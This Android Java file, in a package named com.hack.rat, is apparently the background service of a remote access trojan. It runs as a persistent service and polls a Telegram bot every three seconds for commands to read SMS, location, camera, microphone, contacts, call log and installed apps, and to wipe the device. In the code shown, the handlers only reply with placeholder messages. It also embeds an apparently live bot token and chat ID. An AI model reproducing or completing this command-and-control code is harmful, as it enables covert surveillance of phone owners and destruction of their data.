package com.hack.rat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;

public class BackgroundService extends Service {
    // ⚠️ غير التوكن والايدي هنا
    String botToken = "9078586890:AAHQGbgDTcF0pcn-Sa8qLvDt0H25L4Mhc6g";
    String chatId = "8787584601";
    
    long lastUpdateId = 0;
    Handler handler = new Handler(Looper.getMainLooper());
    Runnable runnable;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        runnable = new Runnable() {
            @Override
            public void run() {
                checkUpdates();
                handler.postDelayed(this, 3000); // يفحص التحديثات كل 3 ثواني
            }
        };
        handler.post(runnable);
        return START_STICKY;
    }

    void checkUpdates() {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1);
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                
                JSONObject json = new JSONObject(sb.toString());
                JSONArray results = json.getJSONArray("result");
                
                for (int i = 0; i < results.length(); i++) {
                    JSONObject update = results.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    JSONObject message = update.getJSONObject("message");
                    String text = message.getString("text");
                    
                    // 🔥 تنفيذ الأوامر
                    if (text.equals("/sms")) {
                        sendMsg("📩 تم طلب الرسائل (جاري التنفيذ...)");
                    } else if (text.equals("/loc")) {
                        sendMsg("📍 الموقع (جاري التنفيذ...)");
                    } else if (text.equals("/photo")) {
                        sendMsg("📸 تصوير الكاميرا (جاري التنفيذ...)");
                    } else if (text.equals("/mic")) {
                        sendMsg("🎤 تسجيل المايك (جاري التنفيذ...)");
                    } else if (text.equals("/contacts")) {
                        sendMsg("📇 جهات الاتصال (جاري التنفيذ...)");
                    } else if (text.equals("/call")) {
                        sendMsg("📞 سجل المكالمات (جاري التنفيذ...)");
                    } else if (text.equals("/apps")) {
                        sendMsg("📱 التطبيقات المثبتة (جاري التنفيذ...)");
                    } else if (text.equals("/wipe")) {
                        sendMsg("💥 مسح الجهاز (جاري التنفيذ...)");
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    void sendMsg(String msg) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(msg, "UTF-8");
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
